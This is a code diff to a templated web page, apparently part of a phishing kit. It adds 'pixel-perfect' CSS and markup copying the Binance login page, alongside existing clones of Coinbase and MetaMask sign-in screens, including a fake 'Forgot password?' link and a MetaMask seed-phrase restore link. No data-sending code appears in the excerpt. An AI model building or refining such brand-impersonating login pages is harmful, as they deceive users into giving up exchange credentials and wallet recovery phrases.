@@ -151,12 +151,22 @@
   body.brand-metamask .mm-restore { display:block; text-align:center; margin-top:14px; font-size:.83rem; color:#9fa6b2; }
   body.brand-metamask .mm-restore a { color:#F6851B; font-weight:500; }
 
-  body.brand-binance { background:#181A20; color:#eaecef; }
-  body.brand-binance .auth { background:#1e2026; border:1px solid #2e3340; border-radius:8px; }
-  body.brand-binance input { background:#2b2f36; border:1px solid #474d57; color:#eaecef; }
-  body.brand-binance input:focus { border-color:#F0B90B; background:#2b2f36; box-shadow:none; }
-  body.brand-binance button { background:#F0B90B; color:#1a1a1a; border-radius:4px; background-image:none; font-weight:700; }
+  /* Binance: pixel-perfect — accounts.binance.com/en/login */
+  body.brand-binance { background:#0B0E11; color:#eaecef; font-family:'Roboto',system-ui,sans-serif; }
+  body.brand-binance .auth { background:#1E2026; border:none; border-radius:16px; padding:40px 40px 32px; max-width:400px; box-shadow:0 4px 24px rgba(0,0,0,.5); }
+  body.brand-binance h1 { color:#eaecef; font-weight:600; font-size:1.75rem; text-align:left; margin-bottom:20px; letter-spacing:-.01em; }
+  body.brand-binance .sub { display:none; }
+  body.brand-binance .logo-svg { margin-bottom:24px; display:block; }
+  body.brand-binance label { display:block; font-size:.85rem; font-weight:400; color:#848E9C; margin-bottom:8px; }
+  body.brand-binance input { background:#2B2F36; border:1px solid #2B2F36; border-radius:4px; color:#eaecef; font-size:.95rem; padding:14px 16px; height:48px; }
+  body.brand-binance input:focus { border-color:#F0B90B; background:#2B2F36; box-shadow:none; outline:none; }
+  body.brand-binance input::placeholder { color:#474D57; opacity:1; }
+  body.brand-binance button { background:#F0B90B; color:#1E2026; border-radius:4px; background-image:none; font-weight:700; font-size:.95rem; height:48px; padding:0; margin-top:4px; }
   body.brand-binance button:hover { background:#f8d33a; transform:none; filter:none; }
+  body.brand-binance .bn-footer { text-align:center; margin-top:16px; font-size:.85rem; color:#848E9C; }
+  body.brand-binance .bn-footer a { color:#F0B90B; text-decoration:none; font-weight:500; }
+  body.brand-binance .bn-forgot { text-align:right; margin-top:-6px; margin-bottom:4px; }
+  body.brand-binance .bn-forgot a { font-size:.82rem; color:#F0B90B; text-decoration:none; }
 
   /* Coinbase: pixel-perfect — coinbase.com/signin */
   body.brand-coinbase { background:#f9f9f9; color:#0a0b0d; font-family:system-ui,-apple-system,sans-serif; }
@@ -1977,6 +1987,10 @@
   <% } %>
   <% if (tpl.key === 'metamask') { %>
     <div class="mm-restore"><a href="#" onclick="return false">Restore using Secret Recovery Phrase</a></div>
+  <% } %>
+  <% if (tpl.key === 'binance') { %>
+    <div class="bn-forgot"><a href="#" onclick="return false">Forgot password?</a></div>
+    <div class="bn-footer">Don't have an account? <a href="#" onclick="return false">Register</a></div>
   <% } %>
 </div>
 
